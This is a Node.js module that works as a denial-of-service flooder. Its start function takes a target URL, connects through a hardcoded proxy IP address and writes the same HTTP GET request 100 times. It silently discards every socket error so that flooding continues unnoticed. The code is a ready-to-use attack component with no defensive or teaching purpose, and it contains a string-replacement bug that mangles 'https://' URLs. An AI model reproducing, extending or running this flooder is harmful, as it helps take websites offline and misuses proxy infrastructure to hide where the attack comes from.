module.exports.start = (function (url){
    try {
      const net = require('net')
        url = url.replace("http://", "").replace("https://").replace("www.", "")
        let mainUrl = url.split('/')[0];          

        var config = {
            host: mainUrl,
            port: 80
          }
          let proxy = "134.3.255.5:8080";
          let proxyIP = proxy.split(':')[0];
          let proxyPort = proxy.split(':')[1];
          var socket = net.connect(proxyPort, proxyIP, function() {
            console.log('GET ' + mainUrl + '/' + url.split('/')[1] + ' HTTP/1.1\r\n' +'Host: ' + mainUrl + '\r\n' +'\r\n')
            for(let i = 0; i < 100; i++)
            {
              socket.write('GET ' + mainUrl + '/' + url.split('/')[1] + ' HTTP/1.1\r\n' +'Host: ' + mainUrl + '\r\n' +'\r\n');
            }
            socket.on('error', function (params) {
              //console.log(params)
            })
            socket.on('connect_error', function (params) {})
            socket.on('connect_failed', function (params) {})
            socket.on('ETIMEDOUT', function (params) {})
            socket.on('timeout', function (params) {})
            socket.on('emfile', function (params) {})
          });
          
         
    }
    catch(err)
    {
    }
})